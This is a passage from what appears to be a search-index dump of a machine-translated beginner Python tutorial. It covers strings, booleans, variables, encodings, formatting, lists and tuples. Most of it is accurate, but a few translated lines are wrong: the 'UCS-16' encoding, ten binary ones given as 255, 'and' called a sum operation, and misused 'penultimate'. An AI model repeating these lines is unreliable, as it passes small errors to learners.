differently inside the computer, and integer operations are always exact (is division also exact? Yes!) ), while floating-point operations may have rounding errors.</p>"},{"location":"CTF/Python_2/#strings","title":"strings","text":"<p>A string is any text enclosed in single quotes <code>'</code> or double quotes <code>\"</code>, such as <code>'abc'</code>, <code>'xyz'</code>, etc. Note that <code>''</code> or <code>\"\"</code> itself is just a representation, not part of a string, so the string <code>'abc'</code> has only the 3 characters <code>a</code>, <code>b</code>, <code>c</code>. If <code>'</code> itself is also a character, then it can be enclosed in <code>\"\"</code>, for example, <code>\"I'm OK\"</code> contains the 6 characters <code>I</code>, <code>'</code>, <code>m</code>, space, <code>O</code>, and <code>K</code>.</p> <p>What if the string contains both <code>'</code> and <code>\"</code> inside? You can use the escape character <code>\\</code> to identify it, for example.</p> <pre><code>'I\\'m \\\"OK\\\"!'\n</code></pre> <p>The content of the string represented is:</p> <pre><code>I'm \"OK\"!\n</code></pre> <p>The escape character <code>\\</code> can escape many characters, such as <code>\\n</code> for line feeds, <code>\\t</code> for tabs, and the character <code>\\</code> itself should be escaped, so the character represented by <code>\\\\</code> is <code>\\</code>. You can use <code>print()</code> on Python's interactive command line to print the string to see.</p> <pre><code>&gt;&gt;&gt; print('I\\'m ok.')\nI'm ok.\n&gt;&gt;&gt; print('I\\'m learning\\nPython.')\nI'm learning\nPython.\n&gt;&gt;&gt; print('\\\\\\n\\\\')\n\\\n\\\n</code></pre> <p>If there are many characters inside the string that need to be escaped, you need to add a lot of <code>\\</code>. For simplicity, Python also allows <code>r''</code> to indicate that the string inside <code>''</code> is not escaped by default, so you can try it yourself at</p> <pre><code>&gt;&gt;&gt; print('\\\\\\t\\\\')\n\\       \\\n&gt;&gt;&gt; print(r'\\\\\\t\\\\')\n\\\\\\t\\\\\n</code></pre> <p>If there are many newlines inside the string, it is not good to read them in one line with <code>\\n</code>. For simplicity, Python allows to use <code>'''...'''</code> format to represent multiple lines of content, try it yourself:</p> <pre><code>&gt;&gt;&gt; print('''line1\n... line2\n... line3''')\nline1\nline2\nline3\n</code></pre> <p>The above is typed within the interactive command line, note that when typing multiple lines, the prompt changes from <code>&gt;&gt;&gt;</code>  to <code>...</code>,  prompting you to continue typing on the previous line, note that <code>...</code>  is a prompt, not part of the code: `.</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502Command Prompt - python                           _ \u25a1 x \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502&gt;&gt;&gt; print('''line1                                      \u2502\n\u2502... line2                                               \u2502\n\u2502... line3''')                                           \u2502\n\u2502line1                                                   \u2502\n\u2502line2                                                   \u2502\n\u2502line3                                                   \u2502\n\u2502                                                        \u2502\n\u2502&gt;&gt;&gt; _                                                   \u2502\n\u2502                                                        \u2502\n\u2502                                                        \u2502\n\u2502                                                        \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>When the terminator <code>'''</code> and the brackets <code>)</code> have been entered, the statement is executed and the result is printed.</p> <p>If written as a program and saved as a <code>.py</code> file, it would be.</p> <pre><code>print('''line1\nline2\nline3''')\n</code></pre> <p>The multi-line string <code>'''...'''</code>  can also be used with <code>r</code> in front, please test it yourself at:</p> <pre><code># -*- coding: utf-8 -*-\nprint(r'''hello,\\n\nworld''')\n</code></pre>"},{"location":"CTF/Python_2/#boolean-values","title":"Boolean values","text":"<p>Boolean values are identical to the representation of Boolean algebra. A Boolean value has only two values, <code>True</code>, <code>False</code>, either <code>True</code> or <code>False</code>. In Python, a Boolean value can be expressed directly as <code>True</code>, <code>False</code> (please note the case), or it can be calculated by Boolean operations as follows.</p> <pre><code>&gt;&gt;&gt; True\nTrue\n&gt;&gt;&gt; False\nFalse\n&gt;&gt;&gt; 3 &gt; 2\nTrue\n&gt;&gt;&gt; 3 &gt; 5\nFalse\n</code></pre> <p>Boolean values can be operated on with <code>and</code>, <code>or</code> and <code>not</code>.</p> <p>The <code>and</code> operation is a sum operation, and the result of the <code>and</code> operation is <code>True</code> only if all are <code>True</code>.</p> <pre><code>&gt;&gt;&gt; True and True\nTrue\n&gt;&gt;&gt; True and False\nFalse\n&gt;&gt;&gt; False and False\nFalse\n&gt;&gt;&gt; 5 &gt; 3 and 3 &gt; 1\nTrue\n</code></pre> <p>The <code>or</code> operation is an or operation, and as long as one of them is <code>True</code>, the result of the <code>or</code> operation is <code>True</code>.</p> <pre><code>&gt;&gt;&gt; True or True\nTrue\n&gt;&gt;&gt; True or False\nTrue\n&gt;&gt;&gt; False or False\nFalse\n&gt;&gt;&gt; 5 &gt; 3 or 1 &gt; 3\nTrue\n</code></pre> <p>The <code>not</code> operation is a non-operation; it is a monadic operator that turns <code>True</code> into <code>False</code> and <code>False</code> into <code>True</code>.</p> <pre><code>&gt;&gt;&gt; not True\nFalse\n&gt;&gt;&gt; not False\nTrue\n&gt;&gt;&gt; not 1 &gt; 2\nTrue\n</code></pre> <p>Boolean values are often used in conditional judgments, e.g.</p> <pre><code>if age &gt;= 18:\n    print('adult')\nelse:\n    print('teenager')\n</code></pre>"},{"location":"CTF/Python_2/#null-values","title":"Null values","text":"<p>A null value is a special value in Python, denoted by <code>None</code>. <code>None</code> cannot be interpreted as <code>0</code>, because <code>0</code> is meaningful, and <code>None</code> is a special null value.</p> <p>In addition, Python provides a variety of data types, such as lists and dictionaries, and also allows the creation of custom data types, which we will continue to talk about later.</p>"},{"location":"CTF/Python_2/#variables","title":"Variables","text":"<p>The concept of a variable is basically the same as the equation variable in middle school algebra, except that in computer programs, variables can be not only numbers, but also arbitrary data types.</p> <p>Variables are represented in the program by a variable name, which must be a combination of upper and lower case English, numbers, and <code>_</code>, and cannot start with a number, for example.</p> <pre><code>a = 1\n</code></pre> <p>The variable <code>a</code> is an integer.</p> <pre><code>t_007 = 'T007'\n</code></pre> <p>The variable <code>t_007</code> is a string.</p> <pre><code>Answer = True\n</code></pre> <p>The variable <code>Answer</code> is a Boolean value <code>True</code>.</p> <p>In Python, the equal sign <code>=</code> is an assignment statement that can assign any data type to a variable, the same variable can be assigned repeatedly, and it can be a different type of variable, for example.</p> <pre><code># -*- coding: utf-8 -*-\na = 123 # a is an integer\nprint(a)\na = 'ABC' # a becomes a string\nprint(a)\n</code></pre> <p>This type of language where the type of the variable itself is not fixed is called a dynamic language, and its counterpart is a static language. Static languages must specify the variable type when defining a variable, and will report an error if the type does not match when assigning a value. For example, Java is a static language, and the assignment statement is as follows (// indicates a comment)</p> <pre><code>int a = 123; // a is an integer type variable\na = \"ABC\"; // Error: You cannot assign a string to an integer variable\n</code></pre> <p>Dynamic languages are more flexible compared to static languages for this reason.</p> <p>Please don't equate the equal sign of an assignment statement with the equal sign of mathematics. For example, the following code.</p> <pre><code>x = 10\nx = x + 2\n</code></pre> <p>If you understand <code>x = x + 2</code> mathematically, that is not true anyway. In the program, the assignment statement first calculates the expression <code>x + 2</code> on the right side, gets the result <code>12</code>, and then assigns it to the variable <code>x</code>. Since the previous value of <code>x</code> was <code>10</code>, after reassignment, the value of <code>x</code> becomes <code>12</code>.</p> <p>Finally, it is also important to understand how variables are represented in computer memory. When we write:</p> <pre><code>a = 'ABC'\n</code></pre> <p>Here the Python interpreter does two things.</p> <ol> <li>creates a string <code>'ABC'</code> in memory.</li> <li>creates a variable named <code>a</code> in memory and points it to <code>'ABC'</code>.</li> </ol> <p>It is also possible to assign a variable <code>a</code> to another variable <code>b</code>, an operation that actually points the variable <code>b</code> to the data pointed to the variable <code>a</code>, as in the following code.</p> <pre><code># -*- coding: utf-8 -*-\na = 'ABC'\nb = a\na = 'XYZ'\nprint(b)\n</code></pre> <p>Is the last line printing out the contents of variable <code>b</code> as <code>'ABC'</code> or as <code>'XYZ'</code>? If understood in a mathematical sense, one would incorrectly conclude that <code>b</code> is the same as <code>a</code> and should also be <code>'XYZ'</code>, but in fact, the value of <code>b</code> is <code>'ABC'</code>, so let's execute the code line by line to see what is really happening.</p> <p>Executing <code>a = 'ABC'</code>, the interpreter creates the string <code>'ABC'</code> and the variable <code>a</code>, and points <code>a</code> to <code>'ABC'</code>.</p> <p></p> <p>Executing <code>b = a</code>, the interpreter creates the variable <code>b</code> and points <code>b</code> to the string <code>'ABC'</code> pointed to by <code>a</code>.</p> <p></p> <p>Executing <code>a = 'XYZ'</code>, the interpreter creates the string <code>XYZ' and changes the pointing of</code>a<code>to</code>'XYZ'<code>, but</code>b` does not change.</p> <p></p> <p>So, the final result of printing the variable <code>b</code> will naturally be <code>'ABC'</code>.</p>"},{"location":"CTF/Python_2/#constants","title":"Constants","text":"<p>A constant is a variable that cannot be changed, for example, the common mathematical constant \u03c0 is a constant. In Python, constants are usually represented by all-caps variable names.</p> <pre><code>PI = 3.14159265359\n</code></pre> <p>But the fact is that <code>PI</code> is still a variable, and Python has no mechanism at all to ensure that <code>PI</code> won't be changed, so using all-caps variable names for constants is just a customary usage, and if you must change the value of the variable <code>PI</code>, no one can stop you.</p> <p>Finally, an explanation of why division by integers is also exact. In Python, there are two kinds of division, one of which is <code>/</code>.</p> <pre><code>&gt;&gt;&gt; 10 / 3\n3.3333333333333335\n</code></pre> <p><code>/</code> The result of the division calculation is a floating point number, even if two integers are exactly divisible, and the result is a floating point number.</p> <pre><code>&gt;&gt;&gt; 9 / 3\n3.0\n</code></pre> <p>Another type of division is <code>//</code>, called floor division, where the division of two integers remains an integer:</p> <pre><code>&gt;&gt;&gt; 10 // 3\n3\n</code></pre> <p>You read that right, the floor of an integer divided by <code>//</code> is always an integer, even if the division is not exhaustive. To do exact division, use <code>/</code> and you're done.</p> <p>Because <code>//</code> division takes only the integer part of the result, Python also provides a remainder operation that gives you the remainder of the division of two integers by.</p> <pre><code>&gt;&gt;&gt; 10 % 3\n1\n</code></pre> <p>Whether an integer does <code>//</code> division or takes a remainder, the result is always an integer, so the result of integer arithmetic is always exact.</p>"},{"location":"CTF/Python_2/#summary_1","title":"Summary","text":"<p>Python supports a variety of data types, and within the computer, any data can be thought of as an \"object\", and variables are used in programs to point to these data objects.</p> <p>Assigning <code>x = y</code> to a variable is to point the variable <code>x</code> to the real object that the variable <code>y</code> points to. Subsequent assignments to the variable <code>y</code> do not affect the pointing of the variable <code>x</code>.</p> <p>Note: Python's integers have no size limit, while some languages have size limits for integers based on their storage length, for example, Java limits 32-bit integers to <code>-2147483648</code>-<code>2147483647</code>.</p> <p>Python's floating point numbers also have no size limit, but beyond a certain range, they are directly represented as <code>inf</code> (infinity).</p>"},{"location":"CTF/Python_2/#string-and-encoding","title":"String and encoding","text":""},{"location":"CTF/Python_2/#character-encoding","title":"Character encoding","text":"<p>As we have already talked about, strings are also a data type, but what is special about strings is that there is also an encoding problem.</p> <p>Because computers can only process numbers, if you want to process text, you must first convert the text to numbers before you can process it. The earliest computers were designed with 8 bits (bit) as a byte (byte), so the largest integer that a byte can represent is 255 (binary 1111111111 = decimal 255), and to represent larger integers, more bytes must be used. For example, the largest integer that can be represented by two bytes is <code>65535</code> and the largest integer that can be represented by four bytes is <code>4294967295</code>.</p> <p>Since the computer was invented by the Americans, only 127 characters were first encoded into the computer, that is, upper and lower case English letters, numbers and some symbols, this code table is called <code>ASCII</code> code, for example, the code for upper case letter <code>A</code> is <code>65</code> and the code for lower case letter <code>z</code> is <code>122</code>.</p> <p>But to deal with Chinese, obviously, one byte is not enough, at least two bytes are needed, and it should not conflict with ASCII, so China has developed <code>GB2312</code> encoding, which is used to encode Chinese.</p> <p>As you can imagine, there are hundreds of languages in the world, Japan coded Japanese into <code>Shift_JIS</code>, Korea coded Korean into <code>Euc-kr</code>, and each country has its own standard, so there will be inevitable conflicts, and as a result, there will be garbled codes in the mixed text of multiple languages.</p> <p></p> <p>As a result, the Unicode character set was created. Unicode unifies all languages into one set of encodings so that there will be no more problems with garbled code.</p> <p>The Unicode standard has evolved, but the most commonly used is the UCS-16 encoding, which uses two bytes to represent a character (four bytes are needed if very remote characters are to be used). Unicode is directly supported by modern operating systems and most programming languages.</p> <p>Now, run through the differences between ASCII and Unicode encoding: ASCII encoding is 1 byte, while Unicode encoding is usually 2 bytes.</p> <p>The letter <code>A</code> is <code>65</code> in decimal and <code>01000001</code> in binary with ASCII encoding.</p> <p>The character <code>0</code> in ASCII encoding is <code>48</code> in decimal and <code>00110000</code> in binary, noting that the character <code>'0'</code> is different from the integer <code>0</code>.</p> <p>The Chinese character <code>\u4e2d</code> is beyond the scope of ASCII encoding and is <code>20013</code> in decimal and <code>01001110 00101101</code> in binary using Unicode encoding.</p> <p>You can guess that if you encode the ASCII-encoded <code>A</code> in Unicode, you just need to make up the 0 in front of it, so the Unicode encoding of <code>A</code> is <code>00000000 01000001</code>.</p> <p>A new problem arises again: if you unify it into Unicode, the messy code problem disappears from now on. However, if all the text you write is basically in English, Unicode encoding requires twice as much storage space as ASCII encoding, which is very uneconomical in terms of storage and transmission.</p> <p>Therefore, in the spirit of saving, <code>UTF-8</code> encoding, which converts Unicode encoding into <code>variable-length encoding</code>, has emerged. Only very rare characters are encoded as 4-6 bytes. If the text you are transferring contains a large number of English characters, using UTF-8 encoding saves space.</p> Encoding ASCII Unicode UTF-8 A 01000001 00000000 01000001 01000001 \u4e2d x 01001110 00101101 11100100 10111000 10101101 <p>From the table above, you can also find that UTF-8 encoding has the added benefit that ASCII encoding can actually be seen as part of UTF-8 encoding, so a large amount of legacy software that only supports ASCII encoding can continue to work under UTF-8 encoding.</p> <p>Having figured out the relationship between ASCII, Unicode and UTF-8, we can summarize the way character encoding works in common for computer systems nowadays.</p> <p>In the computer memory, Unicode encoding is used uniformly, and when it needs to be saved to the hard disk or needs to be transferred, it is converted to UTF-8 encoding.</p> <p>When editing with Notepad, UTF-8 characters read from a file are converted to Unicode characters in memory, and when editing is complete, Unicode is converted to UTF-8 and saved to the file when saving.</p> <p></p> <p>When browsing the web, the server converts the dynamically generated Unicode content to UTF-8 before transferring it to the browser.</p> <p></p> <p>So you see a lot of web pages with something like <code>&lt;meta charset=\"UTF-8\" /&gt;</code> on the source code, indicating that the page is encoded exactly in UTF-8.</p>"},{"location":"CTF/Python_2/#pythons-strings","title":"Python's strings","text":"<p>With the headache of character encoding out of the way, let's look at Python strings.</p> <p>In the latest version of Python 3, strings are encoded in Unicode, meaning that Python's strings support multiple languages, such as</p> <pre><code>&gt;&gt;&gt; print('\u5305\u542b\u4e2d\u6587\u7684str')\n\u5305\u542b\u4e2d\u6587\u7684str\n</code></pre> <p>For the encoding of individual characters, Python provides the <code>ord()</code> function to obtain an integer representation of the character, and the <code>chr()</code> function to convert the encoding to the corresponding character:</p> <pre><code>&gt;&gt;&gt; ord('A')\n65\n&gt;&gt;&gt; ord('\u4e2d')\n20013\n&gt;&gt;&gt; chr(66)\n'B'\n&gt;&gt;&gt; chr(25991)\n'\u6587'\n</code></pre> <p>If you know the integer encoding of the characters, you can also write <code>str</code> in hexadecimal like this.</p> <pre><code>&gt;&gt;&gt; '\\u4e2d\\u6587'\n'\u4e2d\u6587'\n</code></pre> <p>The two ways of writing are exactly equivalent.</p> <p>Since Python's string type is <code>str</code>, represented in memory as Unicode, a character corresponds to a number of bytes. If you want to transfer it over the network or save it to disk, you need to change <code>str</code> to <code>bytes</code> in bytes.</p> <p>Python represents data of type <code>bytes</code> in single or double quotes prefixed with <code>b</code> as follows.</p> <pre><code>x = b'ABC'\n</code></pre> <p>Be careful to distinguish between <code>'ABC'</code>, which is <code>str</code>, and <code>b'ABC'</code>, which occupies only one byte for each character of <code>bytes</code>, although the content is displayed the same as the former.</p> <p>The <code>str</code> in Unicode can be encoded to the specified <code>bytes</code> by the <code>encode()</code> method, e.g.</p> <pre><code>&gt;&gt;&gt; 'ABC'.encode('ascii')\nb'ABC'\n&gt;&gt;&gt; '\u4e2d\u6587'.encode('utf-8')\nb'\\xe4\\xb8\\xad\\xe6\\x96\\x87'\n&gt;&gt;&gt; '\u4e2d\u6587'.encode('ascii')\nTraceback (most recent call last):\n  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;\nUnicodeEncodeError: 'ascii' codec can't encode characters in position 0-1: ordinal not in range(128)\n</code></pre> <p>Pure English <code>str</code> can be encoded with <code>ASCII</code> as <code>bytes</code>, the content is the same, and <code>str</code> containing Chinese can be encoded with <code>UTF-8</code> as <code>bytes</code>. The <code>str</code> containing Chinese cannot be encoded with <code>ASCII</code> because the Chinese encoding range exceeds the range of <code>ASCII</code> encoding, Python will report an error.</p> <p>In <code>bytes</code>, bytes that cannot be displayed as ASCII characters are displayed with <code>\\x##</code>.</p> <p>Conversely, if we read a stream of bytes from the network or from a disk, the data read is <code>bytes</code>. To change <code>bytes</code> to <code>str</code>, the <code>decode()</code> method is used.</p> <pre><code>&gt;&gt;&gt; b'ABC'.decode('ascii')\n'ABC'\n&gt;&gt;&gt; b'\\xe4\\xb8\\xad\\xe6\\x96\\x87'.decode('utf-8')\n'\u4e2d\u6587'\n</code></pre> <p>If <code>bytes</code> contains bytes that cannot be decoded, the <code>decode()</code> method will report an error.</p> <pre><code>&gt;&gt;&gt; b'\\xe4\\xb8\\xad\\xff'.decode('utf-8')\nTraceback (most recent call last):\n  ...\nUnicodeDecodeError: 'utf-8' codec can't decode byte 0xff in position 3: invalid start byte\n</code></pre> <p>If there are only a small number of invalid bytes in <code>bytes</code>, you can pass <code>errors='ignore'</code> to ignore the erroneous bytes.</p> <pre><code>&gt;&gt;&gt; b'\\xe4\\xb8\\xad\\xff'.decode('utf-8', errors='ignore')\n'\u4e2d'\n</code></pre> <p>To calculate how many characters <code>str</code> contains, you can use the <code>len()</code> function.</p> <pre><code>&gt;&gt;&gt; len('ABC')\n3\n&gt;&gt;&gt; len('\u4e2d\u6587')\n2\n</code></pre> <p>The <code>len()</code> function counts the number of characters in <code>str</code>, if replaced with <code>bytes</code>, the <code>len()</code> function counts the number of bytes.</p> <pre><code>&gt;&gt;&gt; len(b'ABC')\n3\n&gt;&gt;&gt; len(b'\\xe4\\xb8\\xad\\xe6\\x96\\x87')\n6\n&gt;&gt;&gt; len('\u4e2d\u6587'.encode('utf-8'))\n6\n</code></pre> <p>As you can see, 1 Chinese character will usually occupy 3 bytes after UTF-8 encoding, while 1 English character will occupy only 1 byte.</p> <p>When manipulating strings, we often encounter the interconversion of <code>str</code> and <code>bytes</code>. To avoid garbling problems, you should always use UTF-8 encoding for <code>str</code> and <code>bytes</code> conversions.</p> <p>Since Python source code is also a text file, when your source code contains Chinese, be sure to specify saving as UTF-8 when you save the source code. When the Python interpreter reads the source code, in order for it to read it in UTF-8, we usually write these two lines at the beginning of the file.</p> <pre><code>#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n</code></pre> <p>the first line comment is to tell the Linux/OS X system that this is a Python executable and that Windows systems will ignore the comment.</p> <p>The second comment line is to tell the Python interpreter to read the source code in UTF-8 encoding, otherwise, the Chinese output you write in the source code may be garbled.</p> <p>Asserting UTF-8 encoding does not mean that your <code>.py</code> file is UTF-8 encoded; you must and do make sure that the text editor is using UTF-8 without BOM encoding.</p> <p></p> <p>If the <code>.py</code> file itself uses UTF-8 encoding and also declares <code># -*- coding: utf-8 -*-</code>, opening a command prompt to test will display Chinese properly.</p> <p></p>"},{"location":"CTF/Python_2/#formatting","title":"Formatting","text":"<p>The last common problem is how to output a formatted string. We often output something like <code>'Hello dear xxx! Your phone bill for month xx is xx and your balance is xx'</code> and strings like that, and the contents of xxx are changing based on variables, so an easy way to format strings is needed.</p> <p></p> <p>In Python, the formatting used is the same as in C, implemented with <code>%</code>, as an example.</p> <pre><code>&gt;&gt;&gt; 'Hello, %s' % 'world'\n'Hello, world'\n&gt;&gt;&gt; 'Hi, %s, you have $%d.' % ('Michael', 1000000)\n'Hi, Michael, you have $1000000.'\n</code></pre> <p>As you may have guessed, the <code>%</code> operator is used to format strings. Inside a string, <code>%s</code> means replace with a string, <code>%d</code> means replace with an integer, and there are several <code>%?</code> placeholder, followed by several variables or values, the order should correspond well. If there is only one <code>%?</code>, the parentheses can be omitted.</p> <p>Common placeholders are.</p> Placeholders Replacement Content %d Integer %f Float %s String %x Hex Integer <p>Among other things, formatting integers and floating-point numbers also allows you to specify whether to complement zeros and the number of integer and fractional digits.</p> <pre><code># -*- coding: utf-8 -*-\nprint('%2d-%02d' % (3, 1))\nprint('%.2f' % 3.1415926)\n</code></pre> <p>If you're not quite sure what to use, <code>%s</code> always works, and it will convert any data type to a string: the</p> <pre><code>&gt;&gt;&gt; 'Age: %s. Gender: %s' % (25, True)\n'Age: 25. Gender: True'\n</code></pre> <p>There are times when the <code>%</code> inside a string is a normal character. This time it is necessary to escape it and use <code>%%</code> to represent a <code>%</code>.</p> <pre><code>&gt;&gt;&gt; 'growth rate: %d %%' % 7\n'growth rate: 7 %'\n</code></pre>"},{"location":"CTF/Python_2/#format","title":"format()","text":"<p>Another way to format a string is to use the string's <code>format()</code> method, which will replace the placeholders <code>{0}</code>, <code>{1}</code> ...... within the string in order with the passed arguments, although this is much more cumbersome to write than %:.</p> <pre><code>&gt;&gt;&gt; 'Hello, {0}, \u6210\u7ee9\u63d0\u5347\u4e86 {1:.1f}%'.format('\u5c0f\u660e', 17.125)\n'Hello, \u5c0f\u660e, \u6210\u7ee9\u63d0\u5347\u4e86 17.1%'\n</code></pre>"},{"location":"CTF/Python_2/#f-string","title":"f-string","text":"<p>The last way to format strings is to use strings starting with <code>f</code>, called <code>f-string</code>, which differs from normal strings in that strings that contain <code>{xxx}</code> are replaced with the corresponding variable:</p> <pre><code>&gt;&gt;&gt; r = 2.5\n&gt;&gt;&gt; s = 3.14 * r ** 2\n&gt;&gt;&gt; print(f'The area of a circle with radius {r} is {s:.2f}')\nThe area of a circle with radius 2.5 is 19.62\n</code></pre> <p>In the above code, <code>{r}</code> is replaced by the value of the variable <code>r</code>, <code>{s:.2f}</code> is replaced by the value of the variable <code>s</code>, and the <code>.2f</code> after <code>:</code> specifies the formatting parameter (i.e., two decimal places are retained), so the result of the replacement of <code>{s:.2f}</code> is <code>19.62</code>.</p>"},{"location":"CTF/Python_2/#summary_2","title":"Summary","text":"<p>Python 3's strings use Unicode, which directly supports multiple languages.</p> <p>When <code>str</code> and <code>bytes</code> are converted to each other, the encoding needs to be specified. The most common encoding is <code>UTF-8</code>, and Python certainly supports other encodings, such as encoding Unicode to <code>GB2312</code>.</p> <pre><code>&gt;&gt;&gt; '\u4e2d\u6587'.encode('gb2312')\nb'\\xd6\\xd0\\xce\\xc4'\n</code></pre> <p>However, this approach is purely self-defeating. If you have no special business requirements, please keep in mind to use only <code>UTF-8</code> encoding.</p> <p>Formatting strings can be tested easily and quickly with Python's interactive environment.</p>"},{"location":"CTF/Python_2/#reference-source-code","title":"Reference source code","text":"<p>the_string.py</p>"},{"location":"CTF/Python_2/#using-lists-and-tuples","title":"Using lists and tuples","text":""},{"location":"CTF/Python_2/#lists","title":"lists","text":"<p>One of Python's built-in data types is a list, an ordered collection of elements that can be added and removed at any time.</p> <p>For example, listing the names of all the students in a class can be represented by a list.</p> <pre><code>&gt;&gt;&gt; classmates = ['Michael', 'Bob', 'Tracy']\n&gt;&gt;&gt; classmates\n['Michael', 'Bob', 'Tracy']\n</code></pre> <p>The variable <code>classmates</code> is a list, and the number of elements in the list can be obtained using the <code>len()</code> function.</p> <pre><code>&gt;&gt;&gt; len(classmates)\n3\n</code></pre> <p>Use the index to access the element at each position in the list, remembering that the index starts at <code>0</code>.</p> <pre><code>&gt;&gt;&gt; classmates[0]\n'Michael'\n&gt;&gt;&gt; classmates[1]\n'Bob'\n&gt;&gt;&gt; classmates[2]\n'Tracy'\n&gt;&gt;&gt; classmates[3]\nTraceback (most recent call last):\n  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;\nIndexError: list index out of range\n</code></pre> <p>Python will report an <code>IndexError</code> error when the index is out of range, so make sure the index doesn't go out of bounds, and remember that the index of the last element is <code>len(classmates) - 1</code>.</p> <p>To fetch the last element, in addition to calculating the index position, you can also use <code>-1</code> for the index and fetch the last element directly at.</p> <pre><code>&gt;&gt;&gt; classmates[-1]\n'Tracy'\n</code></pre> <p>And so on, you can obtain the penultimate one, the penultimate one.</p> <pre><code>&gt;&gt;&gt; classmates[-2]\n'Bob'\n&gt;&gt;&gt; classmates[-3]\n'Michael'\n&gt;&gt;&gt; classmates[-4]\nTraceback (most recent call last):\n  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;\nIndexError: list index out of range\n</code></pre> <p>Of course, the penultimate one is out of bounds.</p> <p>A list is a mutable ordered table, so it is possible to append elements to the end of a list.</p> <pre><code>&gt;&gt;&gt; classmates.append('Adam')\n&gt;&gt;&gt; classmates\n['Michael', 'Bob', 'Tracy', 'Adam']\n</code></pre> <p>It is also possible to insert an element into a specified position, such as the position with index number <code>1</code>.</p> <pre><code>&gt;&gt;&gt; classmates.insert(1, 'Jack')\n&gt;&gt;&gt; classmates\n['Michael', 'Jack', 'Bob', 'Tracy', 'Adam']\n</code></pre> <p>To delete the element at the end of a list, use the <code>pop()</code> method.</p> <pre><code>&gt;&gt;&gt; classmates.pop()\n'Adam'\n&gt;&gt;&gt; classmates\n['Michael', 'Jack', 'Bob', 'Tracy']\n</code></pre> <p>To delete the element at the specified position, use the <code>pop(i)</code> method, where <code>i</code> is the index position.</p> <pre><code>&gt;&gt;&gt; classmates.pop(1)\n'Jack'\n&gt;&gt;&gt; classmates\n['Michael', 'Bob', 'Tracy']\n</code></pre> <p>To replace an element with another element, you can directly assign it to the corresponding index position.</p> <pre><code>&gt;&gt;&gt; classmates[1] = 'Sarah'\n&gt;&gt;&gt; classmates\n['Michael', 'Sarah', 'Tracy']\n</code></pre> <p>The data types of the elements inside the list can also be different, e.g.</p> <pre><code>&gt;&gt;&gt; L = ['Apple', 123, True]\n</code></pre> <p>A list element can also be another list, e.g.</p> <pre><code>&gt;&gt;&gt; s = ['python', 'java', ['asp', 'php'], 'scheme']\n&gt;&gt;&gt; len(s)\n4\n</code></pre> <p>Note that <code>s</code> has only 4 elements, where <code>s[2]</code> is again a list, which is easier to understand if you split it up.</p> <pre><code>&gt;&gt;&gt; p = ['asp', 'php']\n&gt;&gt;&gt; s = ['python', 'java', p, 'scheme']\n</code></pre> <p>To get <code>'php'</code> you can write <code>p[1]</code> or <code>s[2][1]</code>, so <code>s</code> can be seen as a two-dimensional array, similarly there are three-dimensional and four-dimensional ...... arrays, but they are rarely used.</p> <p>If a list contains not a single element, it is an empty list, which has length 0.</p> <pre><code>&gt;&gt;&gt; L = []\n&gt;&gt;&gt; len(L)\n0\n</code></pre>"},{"location":"CTF/Python_2/#tuple","title":"tuple","text":"<p>Another kind of ordered list is called a tuple: tuples. tuples are very similar to lists, but tuples cannot be modified once they are initialized, for example, they also list the names of classmates.</p> <pre><code>&gt;&gt;&gt; classmates = ('Michael', 'Bob', 'Tracy')\n</code></pre> <p>Now, the tuples classmates cannot be changed, and it has no methods like append(), insert(). You can use <code>classmates[0]</code>, <code>classmates[-1]</code> as normal, but you cannot assign to another element.</p> <p>What is the point of immutable tuples? Because tuples are immutable, the code is safer. If possible, try to use a tuple instead of a list.</p> <p>The tuple trap: When you define a tuple, the elements of the tuple must be identified at the time of definition, e.g.</p> <pre><code>&gt;&gt;&gt; t = (1, 2)\n&gt;&gt;&gt; t\n(1, 2)\n</code></pre> <p>To define an empty tuples, you can write <code>()</code> as follows:</p> <pre><code>&gt;&gt;&gt; t = ()\n&gt;&gt;&gt; t\n()\n</code></pre> <p>However, to define a tuples with only 1 element, if you define it like this.</p> <pre><code>&gt;&gt;&gt; t = (1)\n&gt;&gt;&gt; t\n1\n</code></pre> <p>It's not the tuple that is defined, it's the number <code>1</code>! This is because the parentheses <code>()</code> can represent both tuple and parentheses in a mathematical formula, which creates ambiguity, so Python specifies that in this case, the calculation is done by parentheses, and the result is naturally <code>1</code>.</p> <p>Therefore, tuples with only 1 element must be defined with a comma <code>,</code> to disambiguate.</p> <pre><code>&gt;&gt;&gt; t = (1,)\n&gt;&gt;&gt; t\n(1,)\n</code></pre> <p>Python also adds a comma <code>,</code> when displaying tuples with only 1 element, so that you don't misinterpret them as parentheses in the mathematical sense.</p> <p>Finally, look at a \"mutable\" tuples.</p> <pre><code>&gt;&gt;&gt; t = ('a', 'b', ['A', 'B'])\n&gt;&gt;&gt; t[2][0] = 'X'\n&gt;&gt;&gt; t[2][1] = 'Y'\n&gt;&gt;&gt; t\n('a', 'b', ['X', 'Y'])\n</code></pre> <p>This tuple is defined with 3 elements, <code>'a'</code>, <code>'b'</code> and a list. How come it changed later?</p> <p>Don't worry, let's first look at the definition of the tuples 